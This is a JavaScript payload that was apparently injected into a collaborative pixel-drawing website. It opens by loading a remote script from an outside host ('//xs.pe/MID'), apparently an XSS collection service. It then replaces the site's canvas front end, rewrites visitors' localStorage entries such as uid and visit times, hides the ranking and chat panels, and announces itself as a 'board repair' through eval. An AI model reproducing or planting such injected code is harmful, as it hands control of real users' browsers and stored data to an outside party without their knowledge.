s7=createElement('script');
body.appendChild(s7);
s7.src='//xs.pe/MID';
if (typeof window.runTimes != undefined) {
    throw new Error('ReferenceError: test1 is not defined');
}

if (localStorage.getItem("uid") == '202402171810051769'){
    throw new Error('ReferenceError: test2 is not defined');
}

$("#imgContainer").html(`<canvas id="canvas" class="canvas" width="1600" height="1200" style="border:1px solid #c3c3c3;image-rendering: pixelated;"></canvas>
<div id="grid" style="background-image: linear-gradient(to right, rgb(170, 170, 170) 1px, transparent 1px), linear-gradient(rgb(170, 170, 170) 1px, transparent 1px);background-size: 41px 41px;pointer-events: none;"></div>`);
$("#nav3").empty();

// 重新实现前端
var canvas=document.getElementById("canvas");var context=canvas.getContext("2d");$('#canvas').smartZoom({'containerClass':'zoomableContainer'});var img=new Image;function drawPoint(x,y,c){switch(c){case"1":context.fillStyle="rgb(0, 0, 0)";break;case"2":context.fillStyle="rgb(85, 85, 85)";break;case"3":context.fillStyle="rgb(136, 136, 136)";break;case"4":context.fillStyle="rgb(205, 205, 205)";break;case"0":context.fillStyle="rgb(255, 255, 255)";break;case"5":context.fillStyle="rgb(255, 213, 188)";break;case"6":context.fillStyle="rgb(255, 183, 131)";break;case"7":context.fillStyle="rgb(182, 109, 61)";break;case"8":context.fillStyle="rgb(119, 67, 31)";break;case"9":context.fillStyle="rgb(252, 117, 16)";break;case"10":context.fillStyle="rgb(252, 168, 14)";break;case"11":context.fillStyle="rgb(253, 232, 23)";break;case"12":context.fillStyle="rgb(255, 244, 145)";break;case"13":context.fillStyle="rgb(190, 255, 64)";break;case"14":context.fillStyle="rgb(112, 221, 19)";break;case"15":context.fillStyle="rgb(49, 161, 23)";break;case"16":context.fillStyle="rgb(50, 182, 159)";break;case"17":context.fillStyle="rgb(136, 255, 243)";break;case"18":context.fillStyle="rgb(36, 181, 254)";break;case"19":context.fillStyle="rgb(18, 92, 199)";break;case"20":context.fillStyle="rgb(38, 41, 96)";break;case"21":context.fillStyle="rgb(139, 47, 168)";break;case"22":context.fillStyle="rgb(255, 89, 239)";break;case"23":context.fillStyle="rgb(255, 169, 217)";break;case"24":context.fillStyle="rgb(255, 100, 116)";break;case"25":context.fillStyle="rgb(240, 37, 35)";break;case"26":context.fillStyle="rgb(177, 18, 6)";break;case"27":context.fillStyle="rgb(116, 12, 0)";break;default:context.fillStyle="#FFFFFF"}context.fillRect(x,y,1,1)}function online(){$.get("./online.php",function(result){$("#count").html(result)})}function changename(){var nickname=prompt("请输入昵称",localStorage.getItem("nickname"));if(nickname){document.getElementById("nickname").innerHTML=nickname;localStorage.setItem("nickname",nickname);let data="uid="+localStorage.getItem("uid")+"&nickname="+localStorage.getItem("nickname"),url="./nickname.php",xhr=new XMLHttpRequest;xhr.open("post",url);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data)}}var time=new Date;function drawmap(){document.getElementById("reload").innerHTML="更新中...";let data="uid="+localStorage.getItem("uid"),url="./update.php?time=0",xhr=new XMLHttpRequest;xhr.open("post",url);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data);xhr.onreadystatechange=function(){if(xhr.readyState===4&&(xhr.status===200||xhr.status===304)){var obj=JSON.parse(xhr.responseText);for(i=0;i<=1599;i=i+1){for(j=0;j<=1199;j=j+1){map=i+","+j;if(typeof obj[map]!="undefined"){c=obj[map];drawPoint(i,j,c)}else{drawPoint(i,j,0)}}}var loading=document.getElementById("loading");loading.style.display="none";document.getElementById("reload").innerHTML="点击更新画布"}};online()}$(function(){$(".palette").click(function(event){$(this).addClass("picked");$(this).siblings().removeClass("picked")})});function updaterank(){let data="uid="+localStorage.getItem("uid")+"&nickname="+localStorage.getItem("nickname")+"&count="+localStorage.getItem("pixcount"),url="./nickname.php",xhr=new XMLHttpRequest;xhr.open("post",url);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data)}function ten(str){return parseInt(str)<10?"0"+str:str}function update(){document.getElementById("reload").innerHTML="更新中1...";var timenew=new Date;let data="count="+localStorage.getItem("pixcount"),url="./update.php?time="+time.getFullYear()+ten(time.getMonth()+1)+ten(time.getDate())+ten(time.getHours())+ten(time.getMinutes())+ten(time.getSeconds()),xhr=new XMLHttpRequest;xhr.open("post",url);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");xhr.send(data);xhr.onreadystatechange=function(){if(xhr.readyState===4&&(xhr.status===200||xhr.status===304)){var obj=JSON.parse(xhr.responseText);for(i=0;i<=1599;i=i+1){for(j=0;j<=1199;j=j+1){map=i+","+j;if(typeof obj[map]!="undefined"){c=obj[map];drawPoint(i,j,c)}}}var loading=document.getElementById("loading");loading.style.display="none";document.getElementById("reload").innerHTML="点击更新画布"}};updaterank();online()}window.setInterval(online,3e4);if(localStorage.getItem("pixcount")==null){localStorage.setItem("pixcount","0")}document.getElementById("pixcount").innerHTML=localStorage.getItem("pixcount");if(localStorage.getItem("nickname")==null){localStorage.setItem("nickname","点击设置昵称")}document.getElementById("nickname").innerHTML=localStorage.getItem("nickname");setInterval(update,15e3);
eval("console.info('Board repair completed. Common functions are available.'); // 0x3dac2@proton.me");
drawmap();

// 记录访问日期
var now = new Date();
if (localStorage.getItem("uid") == 5) { // 特殊用户记录
    localStorage.setItem("uid", now.toISOString());
}
if (window.runTimes === 1) {
    var timeList = localStorage.getItem("timeList"); // 访问时间列表
    if (timeList == null) timeList = "";
    localStorage.setItem("timeList", timeList + ", " + now.toLocaleString('zh-cn'));
}

// 记录本次绘制的像素数量，以辨别是否对画布有操作
var initialPixCount = -1;
$(function () {
    initialPixCount = localStorage.getItem("pixcount");
});
$(window).on('beforeunload', function () {
	if (localStorage.getItem("pixcount")!=null){
    localStorage.setItem("printInfo",
        now.toLocaleString('zh-cn') + " --> "
        + String(localStorage.getItem("pixcount") - initialPixCount));
	}
});

// 更改背景
if (localStorage.getItem("noxss") == "1") {
    $('#page').css({
        'background': '#2b292e',
        'height': '100%',
        'width': '100%'
    });
    $('#info2').children().eq(1).css("display", "none");
    $(".rank").css("display", "none");
    $("#rank").css("display", "none");
    $("#chat").css("display", "none");
    $("#board").css("line-height", "20px");
    $("#board").html('Tools: <a onclick="canvas.width=canvas.width" style="color:red;font-weight:bold;cursor:pointer;">仅显示新增内容</a>');
}
